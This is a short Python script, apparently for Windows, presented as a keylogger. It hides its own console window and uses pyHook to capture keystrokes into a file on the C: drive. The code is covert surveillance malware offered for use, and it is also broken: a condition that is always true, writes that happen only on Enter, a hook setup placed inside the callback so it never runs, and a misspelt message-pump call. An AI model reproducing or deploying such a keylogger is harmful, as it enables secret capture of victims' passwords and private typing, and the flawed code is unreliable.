# key logger genration


import win32api
import win32console
import win32gui

import pythoncom , pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

def OnkeyboardEvent(event):
    if event.Ascii==5:
        exit(1)
    if event.Ascii !=0 or 8:
        # record open keystroke
        f= open('c:\output.txt', 'r+')
        buffer = f.read()
        f.close()

        # open output.txt to write current new stroke
        f= open('c:\output.txt','w')
        keylogs = chr(event.Ascii)
        if event.Ascii ==13:
            keylogs = '/n'
            buffer += keylogs
            f.write(buffer)
            f.close()
    # create hook manager
    hm = pyHook.HookManager()
    hm.KeyDown = OnkeyboardEvent
    #set hook
    hm.HookKeyboard()
    pythoncom.PumpMessage()

